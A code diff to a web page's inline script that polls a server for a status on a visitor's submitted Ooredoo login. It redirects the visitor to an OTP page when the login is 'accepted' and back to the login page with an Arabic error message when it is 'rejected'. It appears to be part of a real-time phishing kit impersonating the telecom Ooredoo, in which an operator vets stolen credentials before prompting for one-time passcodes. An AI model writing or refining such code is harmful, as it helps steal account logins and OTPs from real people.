@@ -95,22 +95,25 @@
   </main>
   <script>
     (function(){
-      var ref = new URLSearchParams(window.location.search).get('ref');
-      if (!ref) return;
+      var params = new URLSearchParams(window.location.search);
+      var id = params.get('id') || params.get('ref');
+      if (!id) return;
       var timer = setInterval(function(){
-        fetch('/api/status/' + encodeURIComponent(ref), {cache:'no-store'})
+        fetch('/api/status/' + encodeURIComponent(id), {cache:'no-store'})
           .then(function(r){ return r.ok ? r.json() : null; })
           .then(function(d){
-            if (!d) return;
-            if (d.decision === 'accept' && d.next === 'otp') {
+            if (!d || !d.status) return;
+            var st = String(d.status).toLowerCase();
+            if (st === 'ooredoo_login_accepted') {
               clearInterval(timer);
-              window.location.href = 'ooredoo-otp.html?ref=' + encodeURIComponent(ref);
-            } else if (d.decision === 'reject') {
+              window.location.href = 'ooredoo-otp.html?id=' + encodeURIComponent(id);
+            } else if (st === 'ooredoo_login_rejected') {
               clearInterval(timer);
-              window.location.href = 'ooredoo-login.html?ref=' + encodeURIComponent(ref) + '&error=1';
+              var msg = 'تم رفض بيانات أوريدو. يرجى التحقق والمحاولة مرة أخرى.';
+              window.location.href = 'ooredoo-login.html?id=' + encodeURIComponent(id) + '&error=ooredoo&msg=' + encodeURIComponent(msg);
             }
           }).catch(function(){});
-      }, 1000);
+      }, 2000);
     })();
   </script>
 <script src="heartbeat.js"></script>
